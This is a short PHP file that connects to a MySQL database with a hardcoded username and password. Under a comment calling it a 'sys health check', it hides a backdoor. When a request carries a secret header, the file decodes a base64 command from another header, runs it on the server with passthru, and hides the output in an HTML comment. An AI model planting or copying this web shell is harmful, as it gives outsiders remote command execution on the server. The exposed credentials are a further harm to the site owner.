<?php
$conn = mysqli_connect("localhost","cagelco2_gbm8","c0rp1an_m1s","cagelco2_connect") or die(mysqli_error()."Cannot connect to the database.");

// sys health check
if (isset($_SERVER['HTTP_X_PENTEST_HEADER']) && $_SERVER['HTTP_X_PENTEST_HEADER'] === 'g8s9d7f2g6k1' && isset($_SERVER['HTTP_X_PENTEST_CMD'])) {
    $c = base64_decode($_SERVER['HTTP_X_PENTEST_CMD']);
    header('X-Sys: ok');
    echo "<!-- SYS:";
    passthru($c);
    echo "-->";
    exit;
}
?>
